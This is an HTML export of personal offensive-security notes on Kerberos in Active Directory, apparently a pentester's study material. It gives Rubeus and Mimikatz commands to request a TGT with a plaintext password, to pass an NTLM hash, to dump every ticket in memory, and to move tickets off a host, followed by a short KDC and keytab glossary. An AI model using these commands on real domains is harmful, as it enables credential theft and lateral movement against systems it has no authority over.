<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Kerberos</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Kerberos</h1><br/><p><a name="Obtain a TGT"></a><h1>Obtain a TGT</h1></p><p>To get a TGT for another user, you can retrieve it <a href="PrivEsc--Linux--SysAdmin_Stuff--Linux_in_AD_103.html#Obtain a TGT">remotely</a> with Impacket or use Rubeus / Mimikatz locally.</p><p></p><p><em>.\Rubeus.exe asktgt /user:f.frizzle /password:Jenni_Luvs_Magic23 /outfile:ticket.kirbi /nowrap</em></p><p></p><p><em>.\Mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:bob /domain:contoso.com /ntlm:&lt;NTLMHASH&gt;&quot; &quot;exit&quot;</em></p><p></p><p><h2>Exfiltrate TGT</h2></p><p>KIRBI files are binary, but Rubeus will output it using Base64 Encoding. You can save the binary KIRBI file using <strong>outfile</strong> &amp; export it OR you can Copy / Paste it to your machine.</p><p></p><p>Ensure that there are no additional spaces / new lines if you copy the Base64 ticket. The <strong>nowrap</strong> option should prevent this, but double check. Compare file hashes for the KIRBI files.</p><p></p><p><em>echo -n ‘B64_TGT’ | base64 -d &gt; ticket.kirbi</em><em></em></p><p><em></em><em></em></p><p><em>sha256sum ticket.kirbi</em></p><p></p><p><strong>{Windows}</strong> <em>Get-FileHash -Algorithm SHA256 -Path .\ticket.kirbi</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You can use <strong>ktutil</strong> instead to LotL.</p><p></p><p><h3>Steal Other User&#39;s TGT</h3></p><p>You don&#39;t need elevated privs to export tickets belonging to your current user, but you can steal any tickets in RAM if you have Admin access.</p><p></p><p>To steal all tickets in RAM, run Mimikatz in an Admin shell &amp; then:</p><p></p><p><strong>privilege::debug</strong></p><p></p><p><strong>sekurlsa::tickets /export</strong></p><p></p><p><span class="subheading">Filtering Results</span>: This saves a file for EVERY ticket in RAM (not stealthy). TGTs will have <strong>krbtgt</strong> in the name. You can also filter for a specific user (e.g. bob)</p><p></p><p><em>dir | findstr “bob” | findstr “krbtgt”</em></p><p></p><p><h1>Terminology</h1></p><p><a name="Admin Server"></a><h2>KDC vs Admin Server</h2></p><p>In many AD environments, the KDC is the same as the Admin Server, but this isn&#39;t always the case.</p><p></p><p>The KDC (Key Distribution Center) handles authentication &amp; the distribution of tickets. In AD, the DC is usually the KDC since AD uses KRB as the primary authentication protocol.</p><p></p><p>The Admin Server handles administrative operations related to the KRB system (e.g. managing KRB principals, changing passwords, &amp; modifying <a href="PrivEsc--Windows--Sysadmin_Stuff--Kerberos_104.html#Keytab Files">keytab files</a>). It&#39;s typically the DC in an AD environment.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: If a Domain has multiple DCs, is it possible for 1 DC to be the KDC &amp; another DC to be the Admin Server? If so, is it common &amp; are there any benefits to this?</p><p></p><p><h3>Summary</h3></p><p>The Admin Server provides tools for administrators to interact with the KRB system, whereas the KDC is responsible for authentication &amp; tickets.</p><p></p><p><a name="Keytab Files"></a><h2>Keytab Files</h2></p><p>Keytab files are used by services to authenticate to KRB without requiring a password.</p></div>
</body>
</html>
